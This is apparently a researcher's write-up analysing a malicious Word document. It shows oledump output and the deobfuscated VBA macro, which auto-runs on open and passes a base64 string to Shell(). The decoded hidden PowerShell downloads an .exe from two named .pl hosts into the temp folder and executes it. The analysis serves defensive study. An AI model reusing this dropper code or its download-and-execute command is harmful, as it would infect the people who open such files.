#+author: Arkeopix
#+email:  jerome.mendiela@protonmail.ch
#+title:  maldoc ps dropper
#+date:   <2018-02-17 Sat>

* Intro
  This maldoc is quite simple. When opened, it tries to manipulate the user into activating macros and then 
  downloads the folowing stage of the attack. At the time of the analysis, all that is left is the maldoc, so
  this is what this document will focus on.

  #+name: sample hash
  #+begin_quote
  $> sha256sum 489382.doc 
  792f3d72688578cdb18b7c684b40a27284d5fad6890493f237a989acdb5463c0  489382.doc
  arkeopix@0x2a:~/Documents/Reverse/sample_analysis/troj-792f3d72688578cdb18b7c684b40a27284d5fad6890493f237a989acdb5463c0
  #+end_quote

* Analysis
  When opened the document will display a message:
  #+name: maldoc screencap
  [[./image_of_the_maldoc.png]]

  Once the content is activated, the macro will execute, download and execute the next stage.

  In order to understant what is hapening, the first thing to do is to look at the diferent streams in the
  document:
  #+name: Looking at the streams
  #+begin_src sh
    $> python /opt/oledump/oledump.py 489382.doc 
      1:       114 '\x01CompObj'
      2:      4096 '\x05DocumentSummaryInformation'
      3:      4096 '\x05SummaryInformation'
      4:      7429 '1Table'
      5:     85655 'Data'
      6:       488 'Macros/PROJECT'
      7:       113 'Macros/PROJECTwm'
      8: M    2055 'Macros/VBA/Module1'
      9: M   31148 'Macros/VBA/Module2'
     10: M   28897 'Macros/VBA/Module3'
     11: m    1127 'Macros/VBA/ThisDocument'
     12:     11745 'Macros/VBA/_VBA_PROJECT'
     13:      1956 'Macros/VBA/__SRP_0'
     14:       198 'Macros/VBA/__SRP_1'
     15:       348 'Macros/VBA/__SRP_2'
     16:       106 'Macros/VBA/__SRP_3'
     17:       714 'Macros/VBA/dir'
     18:      4096 'WordDocument'
  #+end_src
  So we're going to focus on the stream that contains VBA Code, marked by a capital M, and the streams that 
  contains attributes and config but no code, maked by a lowercase m.

  #+name: dumping macro to file
  #+begin_src sh
    $> oledump.py -s 8 -v 489382.doc > macro1.vba
    $> oledump.py -s 9 -v 489382.doc > macro2.vba
    $> oledump.py -s 10 -v 489382.doc > macro3.vba
    $> oledump.py -s 11 -v 489382.doc > thisdoc.vba
  #+end_src

  The method used for obfuscation here was to create a lot of noise by instantiating and assigning a lot of
  variables that will never be used.

  This is what the malicious macro looks like once stripped of all the noise.
  #+name: payload.vba
  #+begin_src visual-basic :export none :tangle malicious_payload.vba
    Public ps5q137M4 As String
    Public Const iDjg96fA As Integer = 0

    ' begin npZSwg
    Dim oOKlXaxDm
    oOKlXaxDm = "Qcm9jZXNzICRwYXRoO2JyZWFrO31jYXRjaHt3c"
    Dim NOR0eDtb As String
    NOR0eDtb = "ml0ZS1ob3N0ICRfLkV4Y2VwdGlvbi5NZXNzYWdlO3"
    Dim yCmYOH
    yCmYOH = "19"
    Dim npZSwg
    npZSwg = oOKlXaxDm & NOR0eDtb & yCmYOH
    ' Qcm9jZXNzICRwYXRoO2JyZWFrO31jYXRjaHt3cml0ZS1ob3N0ICRfLkV4Y2VwdGlvbi5NZXNzYWdlO319
    ' end npZSwg

    ' begin DO73Jlu1
    Dim H2lLu9 As String
    H2lLu9 = "FkRmlsZSgkdXJsLlRvU3RyaW5nKCksICRwYXRoKTtTdGFydC1"
    Dim cn5yOZMD As String
    cn5yOZMD = "mb3JlYWNoKCR1cmwgaW4gJHVybHMpe3RyeXskd2ViY2xpZW50LkRvd25sb2"
    Dim DO73Jlu1
    DO73Jlu1 = cn5yOZMD & H2lLu9
    ' mb3JlYWNoKCR1cmwgaW4gJHVybHMpe3RyeXskd2ViY2xpZW50LkRvd25sb2FkRmlsZSgkdXJsLlRvU3RyaW5nKCksICRwYXRoKTtTdGFydC1
    ' end DO73Jlu1

    ' begin pKtT5V
    Dim KRhjr
    KRhjr = "0LmdmZCcuU3BsaXQoJywnKTskbmFtZSA9ICRyYW5kb20ubm"
    Dim DksyH5eUI As String
    DksyH5eUI = "V4dCgxLCA2NTUzNik7JHBhdGggPSAkZW52OnRlbXAgKyAnXCcgKyAkbmFtZSArICcuZXhlJzt"
    Dim pKtT5V
    pKtT5V = KRhjr & DksyH5eUI
    ' 0LmdmZCcuU3BsaXQoJywnKTskbmFtZSA9ICRyYW5kb20ubmV4dCgxLCA2NTUzNik7JHBhdGggPSAkZW52OnRlbXAgKyAnXCcgKyAkbmFtZSArICcuZXhlJzt
    'end pKtT5V

    ' begin kPaupq
    Dim W95iCy As String
    W95iCy = "HA6Ly9jb3N0ZmVyLnBsL2ZpbGUvb2Z0LmdmZCxod"
    Dim gjDEemK
    gjDEemK = "HRwOi8vZ2xvcmlhc2V0LnBsL2ZpbGUvb2Z"
    Dim kPaupq
    kPaupq = W95iCy & gjDEemK
    ' HA6Ly9jb3N0ZmVyLnBsL2ZpbGUvb2Z0LmdmZCxodHRwOi8vZ2xvcmlhc2V0LnBsL2ZpbGUvb2Z
    ' end kPaupq

    ' begin bzQ816wbh
    Dim J6ZgRrx5H As String
    J6ZgRrx5H = "A9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJ"
    Dim Fg6vqoG5J
    Fg6vqoG5J = "hbmRvbSA9IG5ldy1vYmplY3QgcmFuZG9tOyR1cmxz"
    Dim MINBlMn As String
    MINBlMn = "ID0gJ2h0d"
    Dim bzQ816wbh
    bzQ816wbh = J6ZgRrx5H & Fg6vqoG5J & MINBlMn
    ' A9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJhbmRvbSA9IG5ldy1vYmplY3QgcmFuZG9tOyR1cmxzID0gJ2h0d
    ' end bzQ816wbh

    ' begin NdLMOgjk
    Dim MYrX7 As String
    MYrX7 = "cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuI"
    Dim ypeCSJ8Dv
    ypeCSJ8Dv = "CR3c2NyaXB0ID0gbmV3LW9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JHdlYmNsaWVudC"
    Dim NdLMOgjk
    NdLMOgjk = MYrX7 & ypeCSJ8Dv
    ' cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuICR3c2NyaXB0ID0gbmV3LW9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JHdlYmNsaWVudC
    ' end NdLMOgjk

    ' cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuICR3c2NyaXB0ID0gbmV3LW9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JHdlYmNsaWVudCA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJhbmRvbSA9IG5ldy1vYmplY3QgcmFuZG9tOyR1cmxzID0gJ2h0dHA6Ly9jb3N0ZmVyLnBsL2ZpbGUvb2Z0LmdmZCxodHRwOi8vZ2xvcmlhc2V0LnBsL2ZpbGUvb2Z0LmdmZCcuU3BsaXQoJywnKTskbmFtZSA9ICRyYW5kb20ubmV4dCgxLCA2NTUzNik7JHBhdGggPSAkZW52OnRlbXAgKyAnXCcgKyAkbmFtZSArICcuZXhlJztmb3JlYWNoKCR1cmwgaW4gJHVybHMpe3RyeXskd2ViY2xpZW50LkRvd25sb2FkRmlsZSgkdXJsLlRvU3RyaW5nKCksICRwYXRoKTtTdGFydC1Qcm9jZXNzICRwYXRoO2JyZWFrO31jYXRjaHt3cml0ZS1ob3N0ICRfLkV4Y2VwdGlvbi5NZXNzYWdlO319
    ps5q137M4 = NdLMOgjk & bzQ816wbh & kPaupq & pKtT5V & DO73Jlu1 & npZSwg

    Function SPMfh(ByVal vCode)
       ' vcode = 
       Dim oXML
       Dim oNode
       Set oXML = CreateObject("Msxml2.DOMDocument.3.0") ' Instanciate a dom element
       Set oNode = oXML.CreateElement("base64") ' Create a new node with name base64
       oNode.dataType = "bin.base64" ' the new node will hold base64
       oNode.text = vCode 
       SPMfh = Stream_BinaryToString(oNode.nodeTypedValue) ' return
       Set oNode = Nothing
       Set oXML = Nothing
    End Function

    Function Stream_BinaryToString(Binary)
       Const adTypeText = 2
       Const adTypeBinary = 1
       'Create Stream object
       Dim BinaryStream 'As New Stream
       Set BinaryStream = CreateObject("ADODB.Stream") ' a special kind of fso item, reading binary data instead of ascii
       'Specify stream type - we want To save binary data.
       BinaryStream.Type = adTypeBinary
       'Open the stream And write binary data To the object
       BinaryStream.Open
       BinaryStream.Write Binary
       'Change stream type To text/string
       BinaryStream.Position = 0
       BinaryStream.Type = adTypeText
       'Specify charset For the output text (unicode) data.
       BinaryStream.CharSet = "us-ascii"
       'Open the stream And get text/string data from the object
       Stream_BinaryToString = BinaryStream.ReadText
       Set BinaryStream = Nothing
    End Function

    Public Function I4281WLDN() ' Called from AutoOpen()
       jipxOK = Shell(SPMfh(ps5q137M4), iDjg96fA) ' ps5q137M4 at macro3.vba:567 iDjg96fA at macro3.vba:3
    End Sub

    Sub AutoOpen() ' Tries to executes the macro whenever the document is opened
       I4281WLDN ' Public function defined at macro2.vba:34
    End Sub
  #+end_src

  So, static analysis tells us that the base64 string is decoded and passed to the =Shell()= function.
  The base64 strings gives us the following command:
  #+name: base64 payload
  #+begin_src sh
    $> echo 'cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuICR3c2NyaXB0ID0gbmV3LW9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JHdlYmNsaWVudCA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJhbmRvbSA9IG5ldy1vYmplY3QgcmFuZG9tOyR1cmxzID0gJ2h0dHA6Ly9jb3N0ZmVyLnBsL2ZpbGUvb2Z0LmdmZCxodHRwOi8vZ2xvcmlhc2V0LnBsL2ZpbGUvb2Z0LmdmZCcuU3BsaXQoJywnKTskbmFtZSA9ICRyYW5kb20ubmV4dCgxLCA2NTUzNik7JHBhdGggPSAkZW52OnRlbXAgKyAnXCcgKyAkbmFtZSArICcuZXhlJztmb3JlYWNoKCR1cmwgaW4gJHVybHMpe3RyeXskd2ViY2xpZW50LkRvd25sb2FkRmlsZSgkdXJsLlRvU3RyaW5nKCksICRwYXRoKTtTdGFydC1Qcm9jZXNzICRwYXRoO2JyZWFrO31jYXRjaHt3cml0ZS1ob3N0ICRfLkV4Y2VwdGlvbi5NZXNzYWdlO319' | base64 -d
    powershell -WindowStyle Hidden $wscript = new-object -ComObject WScript.Shell;$webclient = new-object System.Net.WebClient;$random = new-object random;$urls = 'http://costfer.pl/file/oft.gfd,http://gloriaset.pl/file/oft.gfd'.Split(',');$name = $random.next(1, 65536);$path = $env:temp + '\' + $name + '.exe';foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);Start-Process $path;break;}catch{write-host $_.Exception.Message;}}
  #+end_src
  
  Which gives us the following payload
  #+name: powershell payload
  #+begin_src powershell
    #powershell -WindowStyle Hidden
    $wscript = new-object -ComObject WScript.Shell;
    $webclient = new-object System.Net.WebClient;
    $random = new-object random;
    $urls = 'http://costfer.pl/file/oft.gfd,http://gloriaset.pl/file/oft.gfd'.Split(',');
    $name = $random.next(1, 65536);
    $path = $env:temp + '\' + $name + '.exe';

    foreach ($url in $urls) {
        try {
            $webclient.DownloadFile($url.ToString(), $path);
            Start-Process $path;break;
        } catch {
            write-host $_.Exception.Message;
        }
    }
  #+end_src
